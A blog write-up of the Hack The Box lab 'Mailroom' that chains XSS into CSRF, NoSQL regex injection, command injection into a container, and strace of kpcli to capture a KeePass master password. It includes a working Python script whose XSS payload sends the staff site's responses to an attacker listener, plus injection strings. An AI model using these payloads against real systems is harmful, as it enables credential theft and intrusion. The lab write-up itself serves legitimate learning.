---
title: Mailroom
date: 2023-04-17
categories: [Writeup]
tags: [htb]     
author: Derrick
TOC: true
---

![](https://i.imgur.com/uOqjCuu.png)

# Preface

I’m not an expert in any way shape or form. Fully expect that some of this information may be inaccurate. It was my first time leveraging many of these vulnerabilities so the explanations may not be accurate. Most of the results were interpreted by me from what I’ve read to the best of my ability. If you spot something that is off, please let me know and I’ll make the changes accordingly.

# Overview

Mailroom. If Broscience was annoying, then I don’t even know how to describe this machine. The initial entry for this machine tested my patience and python skills as custom script would be necessary to make progress unless you are fine with repeating the same task over and over for the next couple weeks.

The box starts off with a simple web application that is vulnerable to XSS. During initial reconnaissance, we discover a site that we do not have access to but through chaining XSS → CSRF, we have crude way of interacting with the site. From there we rebuild Tristan’s password through NoSQL injection and using regex operators. Once in, we can directly access the site and perform some sneaky command injection to the container. Container holds credentials to the other user and we can log in with those as well. Finally we trace the process of Matthew logging into his Keepass database and extract his password. Overall, a very fun machine.

# Reconnaissance

---

## Nmap

```jsx
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 17:15 EDT
Nmap scan report for 10.10.11.209
Host is up (0.15s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.22 seconds
```

A full port scan only reveals usual suspects.

## HTTP Site (80/tcp)

![](https://i.imgur.com/XpQaL9O.png)

Pretty standard site. Even Obama and Kanye left testimonials on here, pretty sick. First thing I notice is that this is a PHP site which sort of sets the frame for my attacks moving forward.

<br>


![](https://i.imgur.com/M6u3CiH.png)

The contact page is able to take messages and unlike many machines before this, we actually have someone, in this case an AI, viewing our requests. This means that XSS is definitely within the realm of possibility as an attack vector.

### Subdomains

Command: `gobuster vhost -u http://mailroom.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain`

```jsx
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://mailroom.htb/
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:      gobuster/3.2.0-dev
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/15 12:21:26 Starting gobuster in VHOST enumeration mode
===============================================================
Found: git.mailroom.htb Status: 200 [Size: 13201]
===============================================================
2023/04/15 12:29:38 Finished
===============================================================
```

<br>

**Git Site**

![](https://i.imgur.com/jfGjDV6.png)

Upon visiting the git site, we see source code for a new subdomain. That new subdomain mentioned however, throws a 403 each time we try to visit it. It’s not in the source code to throw that error so its most likely only accepting requests internally. Add that to the list and this is sufficient information to move forward. 

Here’s a quick TLDR.

```
 Summary
 ----------------------------------------------------------
 Ports open:                22, 80
 Hostname:                  mailroom.htb
 Subdomain from fuzzing:    git.mailroom.htb
 Subdomain from the git:    staff-review-panel.mailroom.htb
```

><p class="custom-center">Something to take note of</p>
>
> Note that you get 403 responses from the staff subdomain not because you are unauthorized, that throws a 401, but because you aren't accessing the site locally. It probably checks for the origin 127.0.0.1.
{: .prompt-warning }


# Initial access: Tristan

---

## XSS → CSRF

<video width="100%" controls>
  <source src="/assets/vid/mailroom1.mp4" type="video/mp4">
</video>

One of my early payloads while testing this site for XSS is to attempt to dump a cookie. I do not have very much experience with XSS but I do know that you can try to append a `document.cookie` somewhere in the return to try to steal a cookie. However, upon some testing, there were no cookies to be stolen. The next thing I wanted to confirm was whether or not I can make the user perform an action on our behalf, CSRF. Using this auto-submit form, I was able to receive a post request to my server with the parameters I’ve specified.


> <p class="custom-center">What else can we do?</p>
>
> If we can perform actions on the user’s behalf AND that they are accessing it directly from the machine IP, that means we can interact with the staff site from earlier that we could not do anything with.
{: .prompt-warning }

<br>

<video width="100%" controls>
  <source src="/assets/vid/mailroom2.mp4" type="video/mp4">
</video>

The payload that I used here is inspired from the XSS payloads used in both Crossfit and Derailed. Essentially what it is doing is that two requests are being performed simultaneously, the first makes a request to the staff site and then sends that response to my own server. This allows us to start interacting with the other site as here, we see the `index.php` get displayed.

<br>

```php
require 'vendor/autoload.php';

session_start(); // Start a session
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
header('Content-Type: application/json');
if (!$client) {
  header('HTTP/1.1 503 Service Unavailable');
  echo json_encode(['success' => false, 'message' => 'Failed to connect to the database']);
  exit;
}
$collection = $client->backend_panel->users; // Select the users collection

// Authenticate user & Send 2FA if valid
if (isset($_POST['email']) && isset($_POST['password'])) {

  // Verify the parameters are valid
  if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
  }

  // Check if the email and password are correct
  $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);
...
```

This is the `auth.php` which handles the authentication of the `index.php`. We are going to need an email and a password as our two parameters. There is also a connection to MongoDB which opens up the opportunity for NoSQL injections. Even if we do manage to bypass authentication, it does not get us anywhere since this site enforces 2FA. In the end we still need a password. So, how do we go about recovering it?


> <p class="custom-center">MongoDB Operators</p>
>
> Mongo supports the usage of query operators and it can be used as the base of our injection. If we do something like `email=tristan@mailroom.htb&password[$regex]=^.`, we should get a success. Iterating through each character, we will eventually be able to rebuild his password one character at a time.
{: .prompt-info }

<br>

<details>
<summary> The script </summary>

<div class="language-python highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!" data-original-title="" title=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre></td><td class="rouge-code"><pre>  <span class="kn">import</span> <span class="nn">requests</span>
  <span class="kn">import</span> <span class="nn">string</span>
  <span class="kn">import</span> <span class="nn">re</span>
  <span class="kn">from</span> <span class="nn">http.server</span> <span class="kn">import</span> <span class="n">BaseHTTPRequestHandler</span><span class="p">,</span> <span class="n">HTTPServer</span>
  <span class="kn">import</span> <span class="nn">logging</span>
  <span class="kn">import</span> <span class="nn">sys</span>
  <span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
    
  <span class="c1"># Python server class
</span>  <span class="k">class</span> <span class="nc">S</span><span class="p">(</span><span class="n">BaseHTTPRequestHandler</span><span class="p">):</span>
      <span class="k">def</span> <span class="nf">_set_response</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
          <span class="bp">self</span><span class="p">.</span><span class="n">send_response</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
          <span class="bp">self</span><span class="p">.</span><span class="n">send_header</span><span class="p">(</span><span class="s">'Content-type'</span><span class="p">,</span> <span class="s">'text/html'</span><span class="p">)</span>
          <span class="c1">#self.send_header('Access-Control-Allow-Origin', '*')
</span>          <span class="bp">self</span><span class="p">.</span><span class="n">end_headers</span><span class="p">()</span>
    
      <span class="k">def</span> <span class="nf">do_GET</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
          <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"GET request,</span><span class="se">\n</span><span class="s">Path: %s</span><span class="se">\n</span><span class="s">Headers:</span><span class="se">\n</span><span class="s">%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="p">),</span> <span class="nb">str</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">))</span>
          <span class="bp">self</span><span class="p">.</span><span class="n">_set_response</span><span class="p">()</span>
          <span class="bp">self</span><span class="p">.</span><span class="n">wfile</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"GET request for {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">path</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
    
      <span class="k">def</span> <span class="nf">do_POST</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
          <span class="n">content_length</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Length'</span><span class="p">])</span> <span class="c1"># &lt;--- Gets the size of data
</span>          <span class="n">post_data</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">rfile</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">content_length</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span> <span class="c1"># &lt;--- Gets the data itself and decode it as UTF-8
</span>          <span class="n">post_data</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">n'</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="c1"># &lt;--- Replace all instances of "\n" with actual newlines
</span>          <span class="n">post_data</span> <span class="o">=</span> <span class="n">post_data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'</span><span class="se">\\</span><span class="s">"'</span><span class="p">,</span> <span class="s">'"'</span><span class="p">)</span>
  <span class="c1">#        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
</span>  <span class="c1">#                str(self.path), str(self.headers), post_data)
</span>          <span class="k">if</span> <span class="s">"2FA token"</span> <span class="ow">in</span> <span class="n">post_data</span><span class="p">:</span>
              <span class="n">logging</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">post_data</span><span class="p">)</span>
    
          <span class="bp">self</span><span class="p">.</span><span class="n">_set_response</span><span class="p">()</span>
  <span class="c1">#        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
</span>    
  <span class="k">def</span> <span class="nf">run</span><span class="p">(</span><span class="n">server_class</span><span class="o">=</span><span class="n">HTTPServer</span><span class="p">,</span> <span class="n">handler_class</span><span class="o">=</span><span class="n">S</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">3000</span><span class="p">):</span>
      <span class="n">logging</span><span class="p">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">logging</span><span class="p">.</span><span class="n">INFO</span><span class="p">)</span>
      <span class="n">server_address</span> <span class="o">=</span> <span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
      <span class="n">httpd</span> <span class="o">=</span> <span class="n">server_class</span><span class="p">(</span><span class="n">server_address</span><span class="p">,</span> <span class="n">handler_class</span><span class="p">)</span>
      <span class="n">httpd</span><span class="p">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">10</span> <span class="c1"># This skips over the request so make sure to rerequest it later
</span>      <span class="k">try</span><span class="p">:</span>
          <span class="n">httpd</span><span class="p">.</span><span class="n">handle_request</span><span class="p">()</span>
      <span class="k">except</span> <span class="nb">KeyboardInterrupt</span><span class="p">:</span>
          <span class="k">pass</span>
      <span class="n">httpd</span><span class="p">.</span><span class="n">server_close</span><span class="p">()</span>
     
  <span class="c1"># Payload creation
</span>  <span class="n">url</span> <span class="o">=</span> <span class="s">"http://mailroom.htb/contact.php"</span>
    
  <span class="c1"># Our dictionary of characters
</span>  <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span>
  <span class="n">chars</span> <span class="o">+=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'0'</span><span class="p">,</span> <span class="s">'1'</span><span class="p">,</span> <span class="s">'2'</span><span class="p">,</span> <span class="s">'3'</span><span class="p">,</span> <span class="s">'4'</span><span class="p">,</span> <span class="s">'5'</span><span class="p">,</span> <span class="s">'6'</span><span class="p">,</span> <span class="s">'7'</span><span class="p">,</span> <span class="s">'8'</span><span class="p">,</span> <span class="s">'9'</span><span class="p">,</span> <span class="s">'`'</span><span class="p">,</span> <span class="s">'~'</span><span class="p">,</span> <span class="s">'!'</span><span class="p">,</span> <span class="s">'@'</span><span class="p">,</span> <span class="s">'%'</span><span class="p">,</span> <span class="s">'&amp;'</span><span class="p">,</span> <span class="s">'-'</span><span class="p">,</span> <span class="s">'_'</span><span class="p">,</span> <span class="s">"'"</span><span class="p">,</span> <span class="s">"."</span><span class="p">])</span>
    
  <span class="c1"># XSS payload
</span>    
  <span class="n">xss1</span> <span class="o">=</span> <span class="s">'&lt;script&gt;var xmlHttp = new XMLHttpRequest();xmlHttp.onreadystatechange = function() {if(xmlHttp.readyState == XMLHttpRequest.DONE) {var xhr = new XMLHttpRequest();xhr.open("POST", "http://10.10.14.14:3000", false);xhr.send(xmlHttp.response);};};xmlHttp.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xmlHttp.send("email=tristan@mailroom.htb&amp;password[$regex]=^'</span>
  <span class="n">xss2</span> <span class="o">=</span> <span class="s">'[a-zA-Z0-9!@#%]");xmlHttp.send();&lt;/script&gt;'</span>
    
  <span class="c1"># Initialize values for loop
</span>  <span class="n">counter</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
  <span class="n">initialPassword</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
    
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    
      <span class="n">password</span> <span class="o">=</span> <span class="n">initialPassword</span> <span class="o">+</span> <span class="n">chars</span><span class="p">[</span><span class="n">counter</span><span class="p">]</span>
      <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span>
          <span class="s">"email"</span><span class="p">:</span> <span class="s">"asdf@asdf.asdf"</span><span class="p">,</span>
          <span class="s">"title"</span><span class="p">:</span> <span class="s">"asdf"</span><span class="p">,</span>
          <span class="s">"message"</span><span class="p">:</span> <span class="n">xss1</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="n">xss2</span>
      <span class="p">}</span>
    
      <span class="k">try</span><span class="p">:</span>
          <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>  <span class="c1"># Set timeout to 10 seconds
</span>      <span class="k">except</span> <span class="n">requests</span><span class="p">.</span><span class="n">exceptions</span><span class="p">.</span><span class="n">Timeout</span><span class="p">:</span>
          <span class="c1"># If the request times out, print a message and try again
</span>          <span class="k">print</span><span class="p">(</span><span class="s">"Request timed out, retrying..."</span><span class="p">)</span> 
          <span class="k">continue</span>
    
      <span class="n">counter</span> <span class="o">+=</span> <span class="mi">1</span>
      <span class="n">text</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>
    
      <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s">'/inquiries/(\w+\.html)'</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
      <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
          <span class="n">result</span> <span class="o">=</span> <span class="n">match</span><span class="p">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
          <span class="k">print</span><span class="p">(</span><span class="s">"Here is the inquiry: "</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span>
    
      <span class="k">print</span><span class="p">(</span><span class="s">"If it hangs use this: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">counter</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
      <span class="k">print</span><span class="p">(</span><span class="s">"Attempting password: "</span> <span class="o">+</span> <span class="n">password</span><span class="p">)</span>
      <span class="n">server_thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">run</span><span class="p">)</span>
      <span class="n">server_thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
      <span class="n">server_thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
    
  <span class="c1">#    print(post_data)
</span></pre></td></tr></tbody></table></code></div>    </div>

</details>

Now this script is largely unfinished in terms of its abilities— it is only able to determine one character at a time. Ideally, it would be able to automate the password rebuilding all on its own but my brain is not that big yet. One of these days ill revisit this and try to polish it up.

In short however, this script takes 2 arguments, the first being the current password discovered so far, and the index of the character to start the loop at. Eventually, the password should look like `69**********`. Once his password is fully recovered, we can SSH in with those credentials.

<br>

<video width="100%" controls>
  <source src="/assets/vid/mailroom3.mp4" type="video/mp4">
</video>

Here is a quick demonstration of the script at work. I printed out a lot of extra debug messages not necessary to the script’s job however, since there was a bit of a minor race condition going on, it was really useful to know at what point did the server just hang on me.

# Pivot: Tristan → www-data

---

## Command Injection

Upon logging in, one of the first things I wanted to visit was the apache2 config files. I’d like to learn about how they set up the reverse proxy so that I could set it up on my own in the future. Thing is, there is no apache2 on the box. Everything was put in a container.

Basic recon over Tristan told me that there was nothing really interesting going on but I want to revisit something now that we have access to his account. We can use an SSH tunnel to interact with the front-end of the staff site and login with his password. From there we can grab the 2FA token by taking a look at his email on the main machine.

<br>

```php
if (isset($_POST['status_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['status_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

  // Parse the data between  and </p>
  $start = strpos($contents, '<p class="lead mb-1">');
  if ($start === false) {
    // Data not found
    $status_data = 'Inquiry contents parsing failed';
  } else {
    $end = strpos($contents, '</p>', $start);
    $status_data = htmlspecialchars(substr($contents, $start + 21, $end - $start - 21));
  }
}
```

This is part of the `inquiry.php` page on the staff site that we should now have access to. While we do have control over the $inquiryId variable, most of the input is sanitized with that regex statement. On top of that, even if we do manage to bypass the regex, it is only going to parse a specific part of the text. Fitting in `/etc/password` somewhere in there wont work as that file does not have the `<p class="lead mb-1">` start and `</p>` end.

<br>

![](https://i.imgur.com/tVrpNZf.png)

Here is a quick infographic to display what I mean. Even if you manage to bypass the regex using # to comment out the appendage of .html, you can’t just read any file you would like. There is another character of interest to use here though that isn’t blocked out by regex.


> <p class="custom-center"> The backtick </p>
>
> Backticks work effectively the same as `$( )` but as we know from the regex, we do not have access to those characters. Backticks are used to execute a command before the full command is executed.
{: .prompt-info }

<br>

```php
shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html")
```

This line right here is going to be our point of injection. We have control over the `$inquiryId` as that is what we pass into the statement. The payload that I was able to successfully get a shell with was staged through curl. I simply just dropped a msfvenom payload on disk, changed its permissions, and executed it for a shell.

<br>

<video width="100%" controls>
  <source src="/assets/vid/mailroom4.mp4" type="video/mp4">
</video>

Shell on the container acquired.

# Pivot: www-data → Matthew

---

## Basic Enumeration

Its worth noting that the container did not have ping so any tests for command execution involving ping returned negatives. It doesn’t take very long to see that the password for Matthew lies in the git config file of the same directory you start in.

```bash
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://matthew:H**********@gitea:3000/matthew/staffroom.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
[user]
        email = matthew@mailroom.htb
```

Contents of the git config file. Matthew hardcoded his credentials into the URL for authentication when making commits to the repository. Also note that some characters in the password are URL encoded since this is being passed over the URL after all.

# Privesc: Matthew → Root

---

## Tracing kpcli

One of the first things I ran as Matthew was `pspy64`, a tool to monitor the `/proc` directory. When I ran it as Tristan, nothing popped up. Matthew was a different story however.

<br>

```bash
2023/04/20 04:11:32 CMD: UID=1001 PID=537220 | -bash -c /usr/bin/kpcli 
2023/04/20 04:11:32 CMD: UID=1001 PID=537221 | -bash -c /usr/bin/kpcli
```

Kpcli is a command line tool to interact with KeePass. We also see that inside Matthew’s directory, is a personal KeePass database. To log into the database, you need to enter a master password or a key. Given that there is no key laying around like how there was in Coder, Matthew likely enters a password. Here’s some more information

<br>

```bash
╔══════════╣ Checking sudo tokens     
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is disabled (0)
```

This is some output from linpeas. Now, I do not know if this is a default setting or not because only now did I start paying attention to this but we may be able to trace Matthew’s password with this setup.

The command to run is: `strace -p $(pgrep -u matthew kpcli)` and what it does it that it traces the process where Matthew runs kpcli. 


> <p class="custom-center"> What is strace? </p>
>
> `strace` is a tool that utilizes `ptrace` to specifically debug system calls (syscalls) that were made during the process’ runtime.
{: .prompt-info }

During kpcli’s runtime, many `read()` and `write()` calls were made. Let’s examine some output.

<br>

```bash
octl(3, TCGETS, {B38400 opost isig icanon echo ...}) = 0  
write(1, "=== Entries ===", 16)       = 16 
write(1, 
"
0. food account                                            door.dash.local
1. GItea Admin account                                    git.mailroom.htb
2. gitea database password                       
3. My Gitea Account                                       git.mailroom.htb
4. root acc                                                               
", 375) = 375                                            
ioctl(3, TIOCGWINSZ, {ws_row=24, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0
ioctl(3, TIOCSWINSZ, {ws_row=24, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0
```

Here we see some `write()` calls being made to display what the user has entered. It seems here that they must’ve made a query to display. Take a look at that, there seems to be a root account entry inside this database.

We know that when you log into KeePass, it prompts you to enter a password. So lets go look for that.

```bash
write(1, "Please provide the master password: ", 36) = 36  
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=0, tv_nsec=50000000}, NULL) = 0          
read(0, "!", 8192)                      = 1
read(0, "s", 8192)                      = 1
...
read(0, "9", 8192)                      = 1
```

I’ve gone ahead and formatted the out put for readability but we can see here that those `read()` calls read in the password that Matthew uses to log in. Using that password, we can gain access to the database and retrieve the root password.

## Logging into KeePass

<video width="100%" controls>
  <source src="/assets/vid/mailroom5.mp4" type="video/mp4">
</video>

Just copy the part that is in red and we can just `su root` with that password. And that’s Mailroom by Wyzn, a really well built web box.